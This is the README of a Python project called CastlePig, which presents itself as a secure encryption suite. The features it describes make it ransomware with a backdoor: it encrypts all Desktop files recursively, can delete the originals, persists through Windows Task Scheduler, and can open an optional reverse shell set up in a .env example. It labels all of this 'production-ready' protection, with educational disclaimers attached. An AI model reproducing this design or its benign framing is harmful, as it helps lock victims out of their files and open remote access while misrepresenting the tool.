# CastlePig: Advanced Encryption & Decryption Suite

CastlePig (Adv-Enc-Dec) is a modular, extensible Python project designed for robust, secure file encryption and decryption on modern desktop systems.  
It leverages industry-standard cryptography, secure password management, and automation features to provide a practical, educational, and production-ready solution for protecting sensitive data.

---

## Table of Contents

- [Features](#features)
- [How It Works](#how-it-works)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Module Descriptions](#module-descriptions)
- [Security Model](#security-model)
- [Best Practices](#best-practices)
- [FAQ](#faq)
- [License](#license)
- [Credits](#credits)

---

## Features

- **AES-GCM file encryption** with PBKDF2-HMAC-SHA256 key derivation for strong, authenticated encryption.
- **Cryptographically secure password generation** using Python’s `secrets` module.
- **Password storage in your OS keyring** (Credential Manager, Keychain, or Secret Service) for maximum security—no plaintext passwords on disk.
- **Automated encryption of all files on your Desktop (recursively)**, with options to delete originals and move encrypted files to a dedicated folder.
- **Windows Task Scheduler integration** for persistent, automated operation at user logon.
- **Optional reverse shell for remote administration** (for authorized, ethical use only).
- **Modular, extensible design**—each feature is a separate, importable module for easy maintenance and learning.
- **Environment variable and `.env` file support** for flexible, secure configuration.

---

## How It Works

CastlePig is designed to automate the process of encrypting sensitive files on a user’s system, with a focus on both security and usability.  
Upon execution, the suite will:

1. **Generate or retrieve a strong encryption password** from the OS keyring.
2. **Recursively scan the user’s Desktop** for files to encrypt.
3. **Encrypt each file** using AES-GCM, a modern, authenticated encryption algorithm.
4. **Optionally delete the original files** after successful encryption.
5. **Move encrypted files** to a dedicated folder for easy management.
6. **Optionally add itself to Windows Task Scheduler** for persistent operation.
7. **(Optional) Establish a reverse shell** for remote administration, if enabled and authorized.

All cryptographic operations are performed using the [cryptography](https://cryptography.io/) library, which is widely regarded as the gold standard for Python cryptography.

---

## Project Structure

    castle_pig/
        desktop_files.py         # Recursively finds files on the Desktop
        file_encrypter.py       # Encrypts files with AES-GCM
        file_decrypter.py       # Decrypts files encrypted by file_encrypter.py
        keyring_password.py     # Secure password storage/retrieval via OS keyring
        reverse_shell.py        # Optional reverse shell for remote admin
        secure_password.py      # Generates strong, random passwords
        task_scheduler.py       # Adds script to Windows Task Scheduler
    main.py                     # Main entry point for the suite
    .env                        # (Optional) Environment variable configuration
    README.md                   # This documentation


---

## Requirements

- Python 3.7 or newer
- [cryptography](https://pypi.org/project/cryptography/)
- [keyring](https://pypi.org/project/keyring/)
- [python-dotenv](https://pypi.org/project/python-dotenv/) (optional, for .env config)

Install dependencies with:
```sh
pip install cryptography keyring python-dotenv
```

## INSTALLATION
```
git clone https://github.com/redcooler/Adv-Enc-Dec.git
cd Adv-Enc-Dec
pip install cryptography keyring python-dotenv
(Optional) Create a .env file in the project root for configuration (see below).
-    SERVICE_NAME=CastlePig
-    USERNAME=one_dumb_pig
-    ENCRYPTED_FOLDER=EncryptedFiles
-    ENABLE_REVERSE_SHELL=False
-    REVERSE_SHELL_IP=127.0.0.1
-    REVERSE_SHELL_PORT=4444

```


SERVICE_NAME and USERNAME are used as keys for password storage in the keyring.
ENCRYPTED_FOLDER is where encrypted files are stored.
ENABLE_REVERSE_SHELL, REVERSE_SHELL_IP, and REVERSE_SHELL_PORT control the optional reverse shell feature.

```python
import castle_pig.keyring_password
import castle_pig.file_decrypter

password = castle_pig.keyring_password.load_password_from_keyring(
    service_name="CastlePig",
    username="one_dumb_pig"
)
decrypted_path = castle_pig.file_decrypter.decrypt_file("EncryptedFiles/example1.txt.encrypted", password)
print(f"Decrypted file at: {decrypted_path}")
```

---

## FAQ
Q: What happens if I lose my password or keyring access?
A: You will not be able to decrypt your files. Always ensure you have a backup or access to your keyring.
Q: Can I use this on folders other than Desktop?
A: Yes! Modify the desktop_files.py or main script to target any directory you wish.
Q: Is the reverse shell safe?
A: The reverse shell is for educational and authorized penetration testing only. Never use it without explicit permission.
Q: Can I use this on Linux or macOS?
A: Most features are cross-platform, but Task Scheduler integration is Windows-only. The rest of the suite should work on any OS with Python 3.7+.

---

## License
This project is for educational purposes.
Use at your own risk.

---

Credits: RedCooler
